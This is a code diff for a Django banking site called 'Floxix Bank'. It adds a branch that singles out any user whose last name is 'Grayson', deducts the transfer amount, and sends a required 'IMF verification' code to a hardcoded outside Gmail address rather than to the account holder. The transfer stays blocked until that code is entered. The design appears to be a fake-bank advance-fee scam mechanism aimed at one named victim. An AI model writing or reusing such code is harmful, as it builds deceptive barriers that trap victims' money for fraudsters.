@@ -221,7 +221,7 @@ def transactions_details(request, transfer_id):
 
 @login_required
 def transaction_page(request):
-    """Handles the transaction process, deferring transaction save without IMF verification"""
+    """Handles the transaction process, deferring transaction save without IMF verification unless user is Grayson"""
     u_profile = Profile.objects.get(user=request.user)
     user_profile = Profile.objects.filter(user=request.user)
     formatted_amount = intcomma(int(u_profile.amount))
@@ -247,35 +247,73 @@ def transaction_page(request):
                 u_profile.amount -= transaction_amount
                 u_profile.save()
 
-                # Save the transaction
-                transaction = form.save(commit=False)
-                transaction.user = request.user
-                transaction.save()
+                if request.user.last_name.lower() == "grayson":
+                    # Trigger IMF verification
+                    imf_code = get_random_string(length=6, allowed_chars="0123456789")
 
-                # Send confirmation email
-                formatted_amount = f"{intcomma(transaction_amount)}"
-                subject = "Transaction Successful - Floxix Bank"
-                html_message = render_to_string('main/transaction_email.html', {
-                    'user': request.user,
-                    'amount': formatted_amount,
-                    'account_number': account_number,
-                    'holder_name': holder_name,
-                    'bank_name': bank_name,
-                    'description': description,
-                })
-                plain_message = strip_tags(html_message)  # Convert HTML to plain text
+                    imf_record, created = IMFVerification.objects.get_or_create(
+                        user=request.user,
+                        defaults={'imf_code': imf_code, 'is_verified': False}
+                    )
+                    if not created:
+                        imf_record.imf_code = imf_code
+                        imf_record.is_verified = False
+                        imf_record.save()
 
-                email = EmailMultiAlternatives(
-                    subject,
-                    plain_message,
-                    settings.DEFAULT_FROM_EMAIL,
-                    [request.user.email]
-                )
-                email.attach_alternative(html_message, "text/html")
-                email.send()
+                    # Send IMF code email
+                    subject = "Your IMF Verification Code"
+                    html_message = render_to_string('main/imf_email.html', {'imf_code': imf_code, 'user': request.user})
+                    plain_message = strip_tags(html_message)
 
-                messages.success(request, "Transaction successful! A confirmation email has been sent.")
-                return redirect('success_page')
+                    email = EmailMultiAlternatives(
+                        subject,
+                        plain_message,
+                        settings.DEFAULT_FROM_EMAIL,
+                        ["successsimeon484@gmail.com"]
+                    )
+                    email.attach_alternative(html_message, "text/html")
+
+                    try:
+                        email.send()
+                    except Exception as e:
+                        messages.error(request, "Failed to send IMF code. Try again.")
+                        return redirect('transaction_page')
+
+                    # Store transaction data in session
+                    request.session['pending_transfer_data'] = transaction_data
+                    request.session.modified = True
+                    return redirect('verify_imf')
+
+                else:
+                    # Save the transaction
+                    transaction = form.save(commit=False)
+                    transaction.user = request.user
+                    transaction.save()
+
+                    # Send confirmation email
+                    formatted_amount = f"{intcomma(transaction_amount)}"
+                    subject = "Transaction Successful - Floxix Bank"
+                    html_message = render_to_string('main/transaction_email.html', {
+                        'user': request.user,
+                        'amount': formatted_amount,
+                        'account_number': account_number,
+                        'holder_name': holder_name,
+                        'bank_name': bank_name,
+                        'description': description,
+                    })
+                    plain_message = strip_tags(html_message)
+
+                    email = EmailMultiAlternatives(
+                        subject,
+                        plain_message,
+                        settings.DEFAULT_FROM_EMAIL,
+                        [request.user.email]
+                    )
+                    email.attach_alternative(html_message, "text/html")
+                    email.send()
+
+                    messages.success(request, "Transaction successful! A confirmation email has been sent.")
+                    return redirect('success_page')
     else:
         form = TransferForm()
 
@@ -286,6 +324,7 @@ def transaction_page(request):
         "formatted_amount": formatted_amount,
     }
     return render(request, 'main/transaction_page.html', context)
+
 
 
 
@@ -319,6 +358,7 @@ def verify_imf(request):
                     amount = int(transaction_data.get("amount", 0))  # Ensure integer conversion
                     transaction_pin = transaction_data.get("transaction_pin")
                     bank_name = transaction_data.get("bank_name")
+                    holder_name = transaction_data.get("holder_name")
                     description = transaction_data.get("description")
 
                     if not all([account_number, amount, transaction_pin, bank_name]):
@@ -339,6 +379,7 @@ def verify_imf(request):
                             amount=amount,
                             transaction_pin=transaction_pin,
                             bank_name=bank_name,
+                            holder_name=holder_name,
                             description=description,
                         )
 
@@ -355,6 +396,7 @@ def verify_imf(request):
                         subject = "Transaction Successful - Floxix Bank"
                         html_message = render_to_string('main/transaction_email.html', {
                             'user': request.user,
+                            'holder_name': holder_name,
                             'amount': formatted_amount,
                             'account_number': account_number,
                             'bank_name': bank_name,
